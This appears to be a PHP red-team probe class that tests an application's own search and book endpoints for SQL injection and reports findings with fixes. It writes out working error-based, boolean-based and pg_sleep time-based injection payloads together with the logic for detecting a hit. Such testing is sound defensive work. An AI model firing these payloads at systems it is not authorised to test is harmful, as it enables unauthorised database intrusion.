<?php

namespace RedTeam\Probes;

use RedTeam\Finding;
use RedTeam\Probe;

/**
 * Fires the classic SQLi families at every parameter that reaches a query:
 *   - error-based:   payloads that break SQL syntax; a leaked SQLSTATE/PDO error
 *                    means input hit the parser unescaped.
 *   - boolean-based: ' OR '1'='1 vs ' AND '1'='2 — a result-count swing implies
 *                    the predicate was injected.
 *   - time-based:    pg_sleep(N) — if the response time tracks N, the DB executed
 *                    attacker-controlled SQL (the loudest possible signal).
 *
 * Targets the public search endpoints (q/scope/limit params), the canonical
 * resolver, and book route params. All read-only.
 */
class SqlInjectionProbe extends Probe
{
    public function name(): string
    {
        return 'SQL Injection';
    }

    private const SLEEP_SECONDS = 4;

    public function run(): array
    {
        $findings = [];

        // (method, pathTemplate with %s, baselineValue) for single-param GET endpoints
        $getTargets = [
            ['/api/search/library?q=%s',  'history'],
            ['/api/search/nodes?q=%s',    'history'],
            ['/api/search/library?q=a&limit=%s', '20'],
            ['/api/search/library?q=a&scope=%s', 'all'],
        ];

        foreach ($getTargets as [$tpl, $baseline]) {
            $findings = array_merge($findings, $this->attackGet($tpl, $baseline));
        }

        // Book route param injection (path segment).
        $findings = array_merge($findings, $this->attackBookParam());

        return $findings;
    }

    private function attackGet(string $tpl, string $baseline): array
    {
        $label    = explode('?', $tpl)[0] . ' (' . $this->paramName($tpl) . ')';
        $findings = [];
        $client   = $this->ctx->anon;

        // --- error-based ---
        $errPayloads = ["'", "')", "';", "\" OR \"1\"=\"1", "' UNION SELECT NULL--", "1; SELECT pg_sleep(0)"];
        $leaked = false;
        foreach ($errPayloads as $p) {
            $resp = $client->get(sprintf($tpl, rawurlencode($p)));
            if ($resp->looksLikeStackTrace() && $this->mentionsSql($resp->body)) {
                $findings[] = $this->vuln(
                    "SQL error leaked from $label",
                    Finding::CRITICAL,
                    "Payload `$p` produced a database error in the response — input reaches the SQL parser unescaped.",
                    "GET $tpl",
                    $resp->snippet(300),
                    'Use bound parameters / the query builder for this value; never interpolate request input into SQL.'
                );
                $leaked = true;
                break;
            }
        }
        if (!$leaked) {
            $findings[] = $this->safe("No SQL error from $label", 'Syntax-breaking payloads did not surface a DB error.', "GET $tpl");
        }

        // --- boolean-based ---
        $truthy = $client->get(sprintf($tpl, rawurlencode("$baseline' OR '1'='1")));
        $falsy  = $client->get(sprintf($tpl, rawurlencode("$baseline' AND '1'='2")));
        if ($truthy->ok() && $falsy->ok()) {
            $tCount = $this->resultCount($truthy->body);
            $fCount = $this->resultCount($falsy->body);
            // A meaningful, consistent swing suggests the predicate was injected.
            if ($tCount !== null && $fCount !== null && $tCount > $fCount && $tCount - $fCount >= 3) {
                $findings[] = $this->vuln(
                    "Possible boolean-based SQLi in $label",
                    Finding::HIGH,
                    "`OR '1'='1` returned $tCount results vs $fCount for `AND '1'='2` — the predicate may be injectable. Verify manually.",
                    "GET $tpl",
                    "OR-true count=$tCount\nAND-false count=$fCount",
                    'Confirm with sqlmap; if real, parameterise the value.'
                );
            } else {
                $findings[] = $this->safe("No boolean swing in $label", "OR-true=$tCount / AND-false=$fCount — no injectable predicate signal.", "GET $tpl");
            }
        }

        // --- time-based ---
        $findings[] = $this->timeBased($tpl, $baseline, $label);

        return $findings;
    }

    private function timeBased(string $tpl, string $baseline, string $label): Finding
    {
        $client = $this->ctx->anon;
        // Baseline timing.
        $t0 = $client->get(sprintf($tpl, rawurlencode($baseline)))->elapsedMs;

        $payloads = [
            "$baseline'; SELECT pg_sleep(" . self::SLEEP_SECONDS . ")--",
            "$baseline' AND (SELECT " . self::SLEEP_SECONDS . " FROM pg_sleep(" . self::SLEEP_SECONDS . "))--",
            "$baseline'||pg_sleep(" . self::SLEEP_SECONDS . ")||'",
        ];
        foreach ($payloads as $p) {
            $resp = $client->get(sprintf($tpl, rawurlencode($p)));
            // If the server slept ~SLEEP_SECONDS longer than baseline, that's a hit.
            if ($resp->elapsedMs > ($t0 + (self::SLEEP_SECONDS * 1000 * 0.8))) {
                return $this->vuln(
                    "Time-based SQLi in $label",
                    Finding::CRITICAL,
                    sprintf('A pg_sleep(%d) payload delayed the response to %.0fms (baseline %.0fms) — the DB executed injected SQL.',
                        self::SLEEP_SECONDS, $resp->elapsedMs, $t0),
                    "GET $tpl",
                    "payload: $p\nbaseline: " . round($t0) . "ms\ninjected: " . round($resp->elapsedMs) . "ms",
                    'Parameterise this value immediately; this is a confirmed injection.'
                );
            }
        }
        return $this->safe("No time-based SQLi in $label", sprintf('pg_sleep payloads did not delay the response (baseline %.0fms).', $t0), "GET $tpl");
    }

    private function attackBookParam(): array
    {
        // The {book} path segment feeds several lookups. Most routes constrain it,
        // but the public JSON/snapshot routes are worth poking.
        $paths = [
            "/api/books/%s/snapshots",
            "/%s/nodes.json",
        ];
        $findings = [];
        foreach ($paths as $tpl) {
            $payload = rawurlencode("x' OR '1'='1");
            $resp = $this->ctx->anon->get(sprintf($tpl, $payload));
            if ($resp->looksLikeStackTrace() && $this->mentionsSql($resp->body)) {
                $findings[] = $this->vuln(
                    "SQL error via {book} param on $tpl",
                    Finding::HIGH,
                    'A quote in the book path segment produced a DB error.',
                    "GET $tpl",
                    $resp->snippet(220),
                    'Bind the book id; constrain the route param and 404 unknown books.'
                );
            } else {
                $findings[] = $this->safe("Book param safe on $tpl", "Quote in {book} returned HTTP {$resp->status} with no DB error.", "GET $tpl");
            }
        }
        return $findings;
    }

    private function paramName(string $tpl): string
    {
        // crude: last `key=%s`
        if (preg_match('/([a-z_]+)=%s/', $tpl, $m)) {
            return $m[1];
        }
        return 'param';
    }

    private function mentionsSql(string $body): bool
    {
        foreach (['SQLSTATE', 'pg_', 'syntax error at or near', 'PDOException', 'QueryException', 'select '] as $n) {
            if (stripos($body, $n) !== false) {
                return true;
            }
        }
        return false;
    }

    private function resultCount(string $body): ?int
    {
        $json = json_decode($body, true);
        if (!is_array($json)) {
            return null;
        }
        foreach (['results', 'data', 'library', 'nodes', 'hits'] as $key) {
            if (isset($json[$key]) && is_array($json[$key])) {
                return count($json[$key]);
            }
        }
        // top-level list?
        if (array_is_list($json)) {
            return count($json);
        }
        return null;
    }
}
